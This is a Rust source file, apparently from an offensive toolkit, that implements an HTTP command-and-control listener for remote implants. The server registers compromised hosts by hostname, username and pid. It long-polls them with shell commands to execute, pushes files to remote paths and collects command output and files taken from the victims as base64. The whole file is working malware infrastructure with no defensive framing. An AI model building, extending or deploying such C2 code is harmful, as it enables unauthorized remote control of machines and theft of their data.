use axum::extract::{Path, State};
use axum::http::StatusCode;
use axum::response::IntoResponse;
use axum::routing::{get, post};
use axum::{Json, Router};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::sync::{Mutex, mpsc, oneshot};
use tracing::{debug, info, warn};

use crate::session::{PlatformInfo, SessionCommand, SessionManager};

const POLL_TIMEOUT: Duration = Duration::from_secs(30);
const HEARTBEAT_TIMEOUT: Duration = Duration::from_secs(60);

#[derive(Clone)]
struct C2State {
    manager: Arc<SessionManager>,
    http_sessions: Arc<Mutex<HashMap<String, HttpSessionState>>>,
}

struct HttpSessionState {
    cmd_rx: Arc<Mutex<mpsc::Receiver<SessionCommand>>>,
    last_poll: Instant,
}

#[derive(Deserialize)]
struct CheckinRequest {
    os: String,
    arch: String,
    hostname: String,
    username: String,
    #[serde(default)]
    pid: u32,
    #[serde(default)]
    cwd: String,
    #[serde(default)]
    session_id: Option<String>,
}

#[derive(Serialize)]
struct CheckinResponse {
    session_id: String,
    poll_interval: u64,
}

#[derive(Serialize)]
struct TaskResponse {
    id: Option<u32>,
    command: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    upload: Option<UploadTask>,
    #[serde(skip_serializing_if = "Option::is_none")]
    download: Option<String>,
}

#[derive(Serialize)]
struct UploadTask {
    remote_path: String,
    data_b64: String,
}

#[derive(Deserialize)]
struct ResultRequest {
    id: u32,
    #[serde(default)]
    output: Option<String>,
    #[serde(default)]
    output_b64: Option<String>,
    #[serde(default)]
    error: Option<String>,
}

#[derive(Deserialize)]
struct DownloadResult {
    id: u32,
    data_b64: String,
}

#[derive(Serialize)]
struct ErrorBody {
    error: String,
}

fn err(status: StatusCode, msg: impl Into<String>) -> (StatusCode, Json<ErrorBody>) {
    (status, Json(ErrorBody { error: msg.into() }))
}

pub async fn start(listener: tokio::net::TcpListener, manager: Arc<SessionManager>) {
    let state = C2State {
        manager,
        http_sessions: Arc::new(Mutex::new(HashMap::new())),
    };

    let heartbeat_sessions = state.http_sessions.clone();
    let heartbeat_manager = state.manager.clone();
    tokio::spawn(async move {
        heartbeat_loop(heartbeat_sessions, heartbeat_manager).await;
    });

    let app = Router::new()
        .route("/checkin", post(checkin))
        .route("/task/{session_id}", get(poll_task))
        .route("/result/{session_id}", post(submit_result))
        .route("/download/{session_id}", post(submit_download))
        .with_state(state);

    info!(
        "HTTP C2 listener on {}",
        listener
            .local_addr()
            .unwrap_or_else(|_| "?".parse().unwrap())
    );

    axum::serve(listener, app)
        .await
        .unwrap_or_else(|e| warn!("HTTP C2 server error: {e}"));
}

async fn heartbeat_loop(
    sessions: Arc<Mutex<HashMap<String, HttpSessionState>>>,
    manager: Arc<SessionManager>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(15));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        interval.tick().await;
        let mut hs = sessions.lock().await;
        let stale: Vec<String> = hs
            .iter()
            .filter(|(_, s)| s.last_poll.elapsed() > HEARTBEAT_TIMEOUT)
            .map(|(name, _)| name.clone())
            .collect();

        for name in stale {
            hs.remove(&name);
            let is_http = manager
                .sessions_ref()
                .lock()
                .await
                .get(&name)
                .is_some_and(|s| s.info.mode == "http");
            if is_http {
                let _ = manager.kill_session(&name).await;
                info!("http session '{name}' timed out (no poll within {HEARTBEAT_TIMEOUT:?})");
            }
        }
    }
}

async fn checkin(
    State(state): State<C2State>,
    Json(body): Json<CheckinRequest>,
) -> Result<impl IntoResponse, (StatusCode, Json<ErrorBody>)> {
    let platform = PlatformInfo {
        os: body.os,
        arch: body.arch,
        hostname: body.hostname,
        username: body.username,
        pid: body.pid,
        cwd: body.cwd,
        session_id: body.session_id.clone(),
    };

    let (name, cmd_rx) = state
        .manager
        .register_http_session(platform)
        .await
        .map_err(|e| err(StatusCode::INTERNAL_SERVER_ERROR, e))?;

    state.http_sessions.lock().await.insert(
        name.clone(),
        HttpSessionState {
            cmd_rx: Arc::new(Mutex::new(cmd_rx)),
            last_poll: Instant::now(),
        },
    );

    info!("http session '{name}' checked in");

    Ok((
        StatusCode::OK,
        Json(CheckinResponse {
            session_id: name,
            poll_interval: 5,
        }),
    ))
}

async fn poll_task(
    State(state): State<C2State>,
    Path(session_id): Path<String>,
) -> Result<impl IntoResponse, (StatusCode, Json<ErrorBody>)> {
    // Grab the per-session cmd_rx Arc and update timestamps, then release the HashMap lock
    let cmd_rx = {
        let mut hs = state.http_sessions.lock().await;
        let session = hs.get_mut(&session_id).ok_or_else(|| {
            err(
                StatusCode::NOT_FOUND,
                format!("session '{session_id}' not found"),
            )
        })?;
        session.last_poll = Instant::now();
        session.cmd_rx.clone()
    };

    // Update last_seen on the main session (separate lock scope)
    {
        let mut mgr_sessions = state.manager.sessions_ref().lock().await;
        if let Some(s) = mgr_sessions.get_mut(&session_id) {
            s.info.last_seen = Instant::now();
        }
    }

    // Long-poll: wait up to POLL_TIMEOUT for a command (no locks held)
    let cmd = {
        let mut rx = cmd_rx.lock().await;
        tokio::time::timeout(POLL_TIMEOUT, rx.recv()).await
    };

    match cmd {
        Ok(Some(SessionCommand::Exec {
            command,
            timeout_secs: _,
            reply,
        })) => {
            let id = store_pending_reply(&state, &session_id, reply).await;
            Ok(Json(TaskResponse {
                id: Some(id),
                command: Some(command),
                upload: None,
                download: None,
            }))
        }
        Ok(Some(SessionCommand::FileUp {
            data,
            remote_path,
            reply,
        })) => {
            let id = store_pending_reply_unit(&state, &session_id, reply).await;
            use base64::Engine;
            let b64 = base64::engine::general_purpose::STANDARD.encode(&data);
            Ok(Json(TaskResponse {
                id: Some(id),
                command: None,
                upload: Some(UploadTask {
                    remote_path,
                    data_b64: b64,
                }),
                download: None,
            }))
        }
        Ok(Some(SessionCommand::FileDown { remote_path, reply })) => {
            let id = store_pending_reply(&state, &session_id, reply).await;
            Ok(Json(TaskResponse {
                id: Some(id),
                command: None,
                upload: None,
                download: Some(remote_path),
            }))
        }
        Ok(Some(SessionCommand::SendFrame(_))) => {
            debug!("ignoring SendFrame for http session '{session_id}'");
            Ok(Json(TaskResponse {
                id: None,
                command: None,
                upload: None,
                download: None,
            }))
        }
        Ok(None) => {
            // Channel closed - session was killed
            Err(err(StatusCode::GONE, "session closed"))
        }
        Err(_) => {
            // Timeout - no command pending
            Ok(Json(TaskResponse {
                id: None,
                command: None,
                upload: None,
                download: None,
            }))
        }
    }
}

async fn submit_result(
    State(state): State<C2State>,
    Path(session_id): Path<String>,
    Json(body): Json<ResultRequest>,
) -> Result<impl IntoResponse, (StatusCode, Json<ErrorBody>)> {
    let pending = state.manager.take_http_pending(&session_id, body.id).await;
    let reply = pending.ok_or_else(|| {
        err(
            StatusCode::NOT_FOUND,
            format!("no pending task {} for '{session_id}'", body.id),
        )
    })?;

    if let Some(error) = body.error {
        let _ = reply.send(Err(error));
    } else if let Some(b64) = body.output_b64 {
        use base64::Engine;
        match base64::engine::general_purpose::STANDARD.decode(&b64) {
            Ok(data) => {
                let _ = reply.send(Ok(data));
            }
            Err(e) => {
                let _ = reply.send(Err(format!("bad base64: {e}")));
            }
        }
    } else {
        let output = body.output.unwrap_or_default();
        let _ = reply.send(Ok(output.into_bytes()));
    }

    Ok(Json(serde_json::json!({ "status": "ok" })))
}

async fn submit_download(
    State(state): State<C2State>,
    Path(session_id): Path<String>,
    Json(body): Json<DownloadResult>,
) -> Result<impl IntoResponse, (StatusCode, Json<ErrorBody>)> {
    let pending = state.manager.take_http_pending(&session_id, body.id).await;
    let reply = pending.ok_or_else(|| {
        err(
            StatusCode::NOT_FOUND,
            format!("no pending task {} for '{session_id}'", body.id),
        )
    })?;

    use base64::Engine;
    match base64::engine::general_purpose::STANDARD.decode(&body.data_b64) {
        Ok(data) => {
            let _ = reply.send(Ok(data));
        }
        Err(e) => {
            let _ = reply.send(Err(format!("bad base64: {e}")));
        }
    }

    Ok(Json(serde_json::json!({ "status": "ok" })))
}

// Pending reply storage: keyed by (session, task_id) -> oneshot reply sender.
// Stored on the SessionManager so the C2 handlers and the heartbeat cleanup can both reach them.

async fn store_pending_reply(
    state: &C2State,
    session: &str,
    reply: oneshot::Sender<Result<Vec<u8>, String>>,
) -> u32 {
    state.manager.store_http_pending(session, reply).await
}

async fn store_pending_reply_unit(
    state: &C2State,
    session: &str,
    reply: oneshot::Sender<Result<(), String>>,
) -> u32 {
    // Wrap the () reply into a Vec<u8> reply so we can use the same pending map
    let (inner_tx, inner_rx) = oneshot::channel();
    tokio::spawn(async move {
        match inner_rx.await {
            Ok(Ok(_)) => {
                let _ = reply.send(Ok(()));
            }
            Ok(Err(e)) => {
                let _ = reply.send(Err(e));
            }
            Err(_) => {
                let _ = reply.send(Err("dropped".into()));
            }
        }
    });
    state.manager.store_http_pending(session, inner_tx).await
}
